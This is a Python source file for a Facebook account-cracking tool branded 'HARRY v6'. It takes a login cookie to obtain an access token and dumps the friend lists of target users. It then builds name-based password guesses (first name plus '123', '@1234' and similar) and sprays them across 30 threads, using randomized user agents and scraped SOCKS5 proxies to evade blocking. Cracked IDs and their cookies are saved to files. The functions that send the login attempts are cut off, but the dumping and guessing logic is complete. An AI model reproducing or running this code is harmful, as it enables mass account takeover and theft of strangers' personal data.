
#-----------------[ IMPORT-MODULE ]-------------------#

def modules():
	print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHECKING FOR UPDATES \x1b[37m")
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try:
		import requests
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m REQUESTS IS BEING INSTALLED \x1b[37m")
		os.system('pip install requests --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m REQUESTS HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import bs4
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m BS4 IS BEING INSTALLED \x1b[37m")
		os.system('pip install bs4 --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m BS4 HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import rich
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m RICH IS BEING INSTALLED \x1b[37m")
		os.system('pip install rich --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m RICH HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	exit()

try:
	import requests as req, re,time,os
	from bs4 import BeautifulSoup as par
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket
	from bs4 import BeautifulSoup as bs
	from bs4 import BeautifulSoup
	import urllib3,rich,base64
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
	from time import localtime as lt
	pretty.install()
	CON=sol()
except ModuleNotFoundError:
	modules()

#------------------[ GLOBAL VARIABLES ]-------------------#

version='OPEN SOURCE'
file_name=[]
ugen2=[]
logincookie=[]
cekap=[]
askc=[]
scp= 'n'
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ualuh=[]


#------------------[ PROXY ]-------------------#

try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:pass 
prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

BLUE = '\x1b[38;5;196m'
WHITE = '\x1b[37m'
P = '\x1b[1;97m'
M = '\x1b[38;5;196m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[38;5;196m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

#------------------[ MACHINE-SUPPORT ]---------------#

def restart():
	os.system(f'python {__file__}')
	os.system('exit')
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/harryexeee')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
def cls():
	os.system('clear')
	banner()
	info()
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]    

#------------------[ LOGO-LAKNAT ]-----------------#

logo=("""     ___ ___                     _____.___.
    /   |   \_____ ______________\__  |   |
   /    ~    \__  \\_  __ \_  __ \/    |   |
   \    Y    // __ \|  | \/|  | \/\____   |
    \___|_  /(____  /__|   |__|   / _____\x1b[38;5;196mv6\x1b[37m
          \/      \/              \/       """)
def info():
	print(f"""\x1b[37m----------------------------------------------
 AUTHOR     : HARRY BABE
 GITHUB     : HARRY-EXE
 FACEBOOK   : HARRY AKUMA は
 VERSION    : \x1b[37m\x1b[38;5;196m{version}\x1b[37m
\x1b[37m----------------------------------------------""")
def banner():
	print(logo)

#------------------[ ACCOUNT CREATION DATE]-----------------#

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:4] in ['6155']            :tahunz = '2024'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz

#------------------[ GREETINGS ]-----------------#

current_time = datetime.datetime.now()
current_hour = current_time.hour
if 5 <= current_hour < 12:
    greeting = "GOOD MORNING   : "
elif 12 <= current_hour < 17:
    greeting = "GOOD AFTERNOON : "
elif 17 <= current_hour < 20:
    greeting = "GOOD EVENING   : "
else:
    greeting = "GOOD NIGHT     : "

#------------------[ NAME AND PSW ASK ]-------------------#

if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
try:open("data/password.xml", "r")
except FileNotFoundError:
    open("data/password.xml", "w")
    pass
def namepsw():
    os.system('clear')
    banner()
    info()
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR REAL NAME")
        linex()
        uname = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR NAME : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
        with open("data/password.xml", "r") as password_file_obj:
            upass = password_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ADD A PSW TO YOUT ACCOUNT")
        linex()
        upass = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR PASSWORD : ")
        linex()
        with open("data/password.xml", "w") as password_file_obj:
            password_file_obj.write(upass)
    animation(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR DETAILS HAS BEEN CHANGED ")
    restart()
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    with open('data/password.xml', 'r') as password_file:
        upass = password_file.readline().strip()
    if len(uname) > 1 and len(upass) > 1:
        pass
    else:
        namepsw()
except FileNotFoundError:
    namepsw()
except IOError:
    namepsw()
    
def passask():
    with open('data/password.xml', 'r') as file:
        stored_password = file.read().strip()
    linex()
    user_password = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER THE PASSWORD : ")
    if user_password == stored_password:
        pass
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m ACCESS DENIED !")
        restart()

#--------------------[ LOGIN ]--------------#

def login123():
	os.system('clear')
	banner()
	info()
	print(""" \x1b[38;5;196m>>\x1b[37m USE DATR COOKIE """)
	linex()
	print(""" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m LOGIN USING COOKIE """)
	print(""" \x1b[38;5;196m[\x1b[37m0\x1b[38;5;196m]\x1b[37m JOIN GROUPS  """)
	linex()
	lgmt = input(' CHOOSE : ')
	if lgmt == '1':
		login_lagi334()
	elif lgmt == '0':
		groups()
	else:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
		restart()
def login():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f' [\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()

def login_lagi334():
	global logincookie
	try:
		if logincookie:
		    cookie = logincookie
		else:
			linex()
			cookie = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER COOKIE : ')
		try:
			asu = random.choice([m,k,h,b,u])
			open("data/.cok.txt", "w").write(cookie)
			with requests.Session() as rsn:
				try:
					rsn.headers.update({
	                    'Accept-Language': 'id,en;q=0.9',
	                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
	                    'Referer': 'https://www.instagram.com/',
	                    'Host': 'www.facebook.com',
	                    'Sec-Fetch-Mode': 'cors',
	                    'Accept': '*/*',
						'Connection': 'keep-alive',
	                    'Sec-Fetch-Site': 'cross-site',
	                    'Sec-Fetch-Dest': 'empty',
	                    'Origin': 'https://www.instagram.com',
	                    'Accept-Encoding': 'gzip, deflate',
	                })
					response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
					if '"access_token":' in str(response.headers):
						token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
						open("data/.token.txt", "w").write(token)
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m LOGIN DONE RESTARTING !');restart()
					else:
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
				except:
					linex()
					animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
		except Exception as e:
			linex()
			animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
			os.system('rm -rf data/.token.txt && rm -rf data/.cok.txt')
			time.sleep(1)
			back()
	except Exception as e:
		print(e)

#------------------[ MENU ]----------------#

def menu(my_name,my_id):
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	info()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m {greeting}{uname} ")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR PUBLIC IP : {ipadd}")
	linex()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER    : {my_name}")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER ID : {my_id} ")
	linex()
	print(f""" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m CRACK PUBLIC       \x1b[38;5;196m[\x1b[37m4\x1b[38;5;196m]\x1b[37m RESET DETAILS""")
	print(f""" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m CRACK FILE         \x1b[38;5;196m[\x1b[37m5\x1b[38;5;196m]\x1b[37m CONTACT ADMIN""")
	print(f""" \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m CHECK RESULTS      \x1b[38;5;196m[\x1b[37m6\x1b[38;5;196m]\x1b[37m COMMAND GROUPS""")
	print(f""" \x1b[38;5;196m[\x1b[37m0\x1b[38;5;196m]\x1b[37m LOGOUT MENU""")
	linex()
	_____harrryyyy_____ = input(' CHOOSE : ')
	if _____harrryyyy_____ in ['1']:
		harry_public()
	elif _____harrryyyy_____ in ['2']:
		fileopt()
	elif _____harrryyyy_____ in ['3','03']:
		passask()
		harryresults()
	elif _____harrryyyy_____ in ['4','04']:
		passask()
		os.system('rm -rf data/password.xml')
		os.system('rm -rf data/name.xml')
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m RESET DONE')
		restart()
	elif _____harrryyyy_____ in ['5','05']:
		contact()
	elif _____harrryyyy_____ in ['0']:
		passask()
		os.system('rm -rf data/.token.txt')
		os.system('rm -rf data/.cok.txt')
		linex()
		animation(' [✓] DONE LOGOUT ')
		exit()
	elif _____harrryyyy_____ in ['6']:
		groups()
	else:
		linex()
		animation(' [×] SELECT CORRECTLY ')
		back()

#-----------------[ HASIL-CRACK ]-----------------#

def harryresults():
    ok_file_path = '/sdcard/HARRYv6/HARRYv6-OK.txt'
    cp_file_path = '/sdcard/HARRYv6/HARRYv6-CP.txt'

    if not (os.path.exists(ok_file_path) and os.path.exists(cp_file_path)):
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m NO IDS SAVED")
        return
    linex()
    print(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m CHECK OK IDS \n \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m CHECK CP IDS")
    linex()
    user_choice = input(" CHOOSE : ")

    if user_choice == '1':
        linex()
        show_cookies = input(" \x1b[38;5;196m[\x1b[37m>\x1b[38;5;196m]\x1b[37m SHOW COOKIES (y/n): ").lower() == 'y'
        linex()
        process_file(ok_file_path, show_cookies)
    elif user_choice == '2':
        linex()
        process_file(cp_file_path, show_cookies=False)
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID CHOICE ")

def process_file(file_path, show_cookies):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    for i, line in enumerate(lines, start=1):
        parts = line.strip().split('|')
        if show_cookies:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m  {parts[0]} • {parts[1]}")
            kuki = parts[2]
            print(f" [🍪] {kuki}")
        else:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m {parts[0]} | {parts[1]}")
    linex()
    input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TO EXIT ");restart()

#-----------------[ CONTACT ]-----------------#

def contact():
	os.system('xdg-open https://www.facebook.com/harryexe')

#-------------------[ GROUPS ]----------------#

def groups():
	linex()
	print("OPEN SOURCE VERSION")

#-------------------[ CRACK-PUBLIK ]----------------#

def harry_public():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	try:
		linex()
		jum = int(input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TARGET AMOUNT  : '))
		linex()
	except ValueError:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID OPTION ')
		restart()
	if jum<1 or jum>100000000:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m INPUT UID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			head = (
			{"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
			})
			if len(id) == 0:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	          
			)
			else:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	           
			)
			col = ses.get('https://graph.facebook.com/{}'.format(userr),params=params,headers=head,cookies={'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
			os.system('clear')
	try:
		linex()
		print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL ID : \x1b[38;5;196m'+str(len(id))+'\x1b[37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		linex()
		animation(" [×] DUMP ID FAILED ")
		time.sleep(3)
		back()

#-------------[ CRACK-FROM-FILE ]------------------#

def fileopt():
 	crack_file()

def crack_file():
	global file_name
	if file_name:
		o = file_name
	else:
	    linex()
	    o  = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m FILE NAME : ')
	try:lin = open(o).read().splitlines()
	except:
		linex()
		animation(' [×] FILE NOT FOUND')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()

#-------------[ PENGATURAN-IDZ ]---------------#

def setting():
	linex()
	print(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m ONLY OLD IDZ")
	print(" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m ONLY NEW IDZ")
	print(" \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m BOTH MIX IDZ")
	linex()
	hu = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[] 
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()
	method.append('mobile')
	global cekap,askc,scp
	askc += input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SHOW COOKIES : ')
	scp += input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SHOW CHECKPOINT : ')
	passwrd()
	exit() 

#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():
	os.system('clear')
	banner()
	info()
	print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
	linex()
	print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			pwv = []
			frs = nmf.split(' ')[0]
			try:
				lst = nmf.split(' ')[1]
			except:
				lst = ''
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+lst)
					pwv.append(frs+'@'+lst)
					pwv.append(frs+'#'+lst)
					pwv.append(lst+frs)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+lst+'123')
					pwv.append(frs+lst+'1234')
					pwv.append(frs+lst+'@123')
					pwv.append(frs+lst+'@1234')
					pwv.append(frs+lst+'321')
					pwv.append(lst+frs+'123')
					pwv.append(lst+frs+'111')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+lst)
					pwv.append(frs+'@'+lst)
					pwv.append(frs+'#'+lst)
					pwv.append(lst+frs)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+lst+'123')
					pwv.append(frs+lst+'1234')
					pwv.append(frs+lst+'@123')
					pwv.append(frs+lst+'@1234')
					pwv.append(frs+lst+'321')
					pwv.append(lst+frs+'123')
					pwv.append(lst+frs+'111')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'bapi' in method:
				pool.submit(bapi,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('\n\x1b[37m----------------------------------------------')
	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m OK : %s '%(ok))
	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CP : %s '%(cp))
	linex()
	woi = input(' \x1b[38;5;196m>>\x1b[37m ENTER TO BACK')
	restart()

#--------------------[ METODE-B-API ]-----------------#

